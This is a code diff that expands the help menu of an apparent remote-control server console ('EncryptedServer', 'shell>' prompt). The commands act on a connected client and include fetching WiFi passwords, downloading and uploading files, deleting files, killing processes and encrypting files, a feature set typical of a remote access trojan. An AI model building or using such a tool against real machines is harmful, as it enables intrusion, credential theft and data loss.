@@ -161,18 +161,50 @@ class EncryptedServer:
                 return
 
             print("""\nAvailable commands:
-                    dir, path, ipconfig, arp -a, hostname
-                    del [file], cd [path], download [file], upload [file], wall [img]
-                    encrypt [file], decrypt [file]
+                    dir                     List directory contents
+                    path                    Show current working directory
+                    ipconfig                Show network configuration
+                    arp -a                  Display ARP table
+                    hostname                Show system hostname and details
+                    ps                      List running processes
+                    kill <PID/name>         Kill a process by PID or name
+                    system                  Show system resource usage (CPU & Memory)
+                    wifi-networks           List available WiFi networks
+                    wifi-password <network> Get password for a WiFi network
+                    cd <dir>                Change directory
+                    del <file>              Delete a file
+                    download <file>         Download file from client
+                    upload <file>           Upload file to client
+                    encrypt <file>          Encrypt a file
+                    decrypt <file>          Decrypt a file
+                    wall <image>            Change desktop wallpaper
+                    help                    Show this help message
+                    close / exit            Terminate session
                 """)
 
             while True:
                 command = input("shell> ").strip()
                 if command == "help":
                     print("""Available commands:
-                            dir, path, ipconfig, arp -a, hostname
-                            del [file], cd [path], download [file], upload [file], wall [img]
-                            encrypt [file], decrypt [file]
+                            dir                     List directory contents
+                            path                    Show current working directory
+                            ipconfig                Show network configuration
+                            arp -a                  Display ARP table
+                            hostname                Show system hostname and details
+                            ps                      List running processes
+                            kill <PID/name>         Kill a process by PID or name
+                            system                  Show system resource usage (CPU & Memory)
+                            wifi-networks           List available WiFi networks
+                            wifi-password <network> Get password for a WiFi network
+                            cd <dir>                Change directory
+                            del <file>              Delete a file
+                            download <file>         Download file from client
+                            upload <file>           Upload file to client
+                            encrypt <file>          Encrypt a file
+                            decrypt <file>          Decrypt a file
+                            wall <image>            Change desktop wallpaper
+                            help                    Show this help message
+                            close / exit            Terminate session
                         """)
                     continue
 
